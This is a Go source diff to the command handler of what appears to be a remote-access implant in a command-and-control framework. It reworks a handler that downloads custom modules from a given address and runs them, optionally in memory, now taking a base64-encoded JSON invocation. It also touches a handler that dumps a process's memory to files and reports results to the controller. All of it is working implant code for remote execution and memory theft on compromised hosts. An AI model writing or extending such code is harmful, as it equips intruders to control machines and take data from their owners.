@@ -2,6 +2,8 @@ package handler
 
 import (
 	"context"
+	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"os"
 	"path/filepath"
@@ -266,23 +268,41 @@ func runUtils(cmd *cobra.Command, args []string) {
 	c2transport.NotifyC2(cmd, "%s\n", out)
 }
 
-// runCustomModule implements !custom_module --mod_name <name> --exec <command> --env <env> --checksum <checksum> --in_mem <bool> --type <payload_type> --file_to_download <file> --download_addr <addr>
+// runCustomModule implements !custom_module --mod_name <name> --invocation <base64> --checksum <checksum> --in_mem <bool> --type <payload_type> --file_to_download <file> --download_addr <addr>
 func runCustomModule(cmd *cobra.Command, args []string) {
 	modName, _ := cmd.Flags().GetString("mod_name")
-	execCmd, _ := cmd.Flags().GetString("exec")
+	invocationB64, _ := cmd.Flags().GetString("invocation")
 	checksum, _ := cmd.Flags().GetString("checksum")
 	inMem, _ := cmd.Flags().GetBool("in_mem")
 	payloadType, _ := cmd.Flags().GetString("type")
 	fileToDownload, _ := cmd.Flags().GetString("file_to_download")
-	env, _ := cmd.Flags().GetString("env")
 	downloadAddr, _ := cmd.Flags().GetString("download_addr")
 	if modName == "" || checksum == "" {
 		c2transport.NotifyC2(cmd, "Error: args error\n")
 		return
 	}
-	envParsed := strings.Split(env, ",")
-	out := modules.ModuleHandler(downloadAddr, fileToDownload, payloadType, modName, checksum, execCmd, envParsed, inMem)
+	invocation, err := decodeInvocation(invocationB64)
+	if err != nil {
+		c2transport.NotifyC2(cmd, "Error decoding invocation: %v\n", err)
+		return
+	}
+	out := modules.ModuleHandler(downloadAddr, fileToDownload, payloadType, modName, checksum, invocation, inMem)
 	c2transport.NotifyC2(cmd, "%s\n", out)
+}
+
+func decodeInvocation(b64 string) (def.ResolvedInvocation, error) {
+	var inv def.ResolvedInvocation
+	if b64 == "" {
+		return inv, fmt.Errorf("empty invocation payload")
+	}
+	raw, err := base64.StdEncoding.DecodeString(b64)
+	if err != nil {
+		return inv, err
+	}
+	if err := json.Unmarshal(raw, &inv); err != nil {
+		return inv, err
+	}
+	return inv, nil
 }
 
 // runUpdateAgent implements !upgrade_agent --checksum <checksum>
@@ -388,7 +408,7 @@ func runMemDump(cmd *cobra.Command, args []string) {
 		return
 	}
 	outPath := fmt.Sprintf("%s/%d", common.RuntimeConfig.AgentRoot, pid)
-	err := os.MkdirAll(outPath, 0700)
+	err := os.MkdirAll(outPath, 0o700)
 	if err != nil {
 		c2transport.NotifyC2(cmd, "Error: %v\n", err)
 		return
@@ -411,7 +431,7 @@ func runMemDump(cmd *cobra.Command, args []string) {
 		}
 		for base, data := range dumpedData {
 			filePath := fmt.Sprintf("%s/%d_%d.bin", outPath, pid, base)
-			err = util.WriteFileAgent(filePath, data, 0600)
+			err = util.WriteFileAgent(filePath, data, 0o600)
 			if err != nil {
 				c2transport.NotifyC2(cmd, "Error: %v\n", err)
 				return
